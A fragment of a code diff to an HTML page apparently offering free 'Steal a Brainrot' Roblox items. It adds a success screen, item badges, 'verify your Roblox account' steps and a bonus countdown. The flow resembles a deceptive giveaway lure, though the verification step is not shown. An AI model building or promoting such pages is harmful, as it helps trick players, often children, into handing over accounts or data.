+                document.getElementById('selection-screen').style.display = 'none';
+                document.getElementById('success-screen').style.display = 'flex';
+                // Rebuild chosen banner
+                const chosenBanner = document.getElementById('chosen-banner');
+                chosenBanner.innerHTML = '';
+                selectedBrainrots.forEach(index => {
+                    const b = brainrotsData[index];
+                    const badge = document.createElement('div');
+                    badge.className = 'chosen-badge';
+                    badge.innerHTML = `<img src="/brainrots/${b.image}" alt="${b.name}" onerror="this.style.display='none'"> <span>${b.name}</span>`;
+                    chosenBanner.appendChild(badge);
+                });
+                const offerSteps = document.getElementById('offer-steps');
+                if (currentBonusActive) {
+                    offerSteps.innerHTML = `<span>1.</span> Verify your Roblox account<br><span>2.</span> Join the Steal a Brainrot experience<br><span>3.</span> Claim your reward in-game<br><span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots ACTIVE!</strong>`;
+                } else {
+                    offerSteps.innerHTML = `<span>1.</span> Verify your Roblox account<br><span>2.</span> Join the Steal a Brainrot experience<br><span>3.</span> Claim your reward in-game<br><span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>`;
                 }
-            }
-        })();
+                setTimeout(launchConfetti, 400);
+            } catch (e) {}
+        }
     </script>
 </body>
 </html>
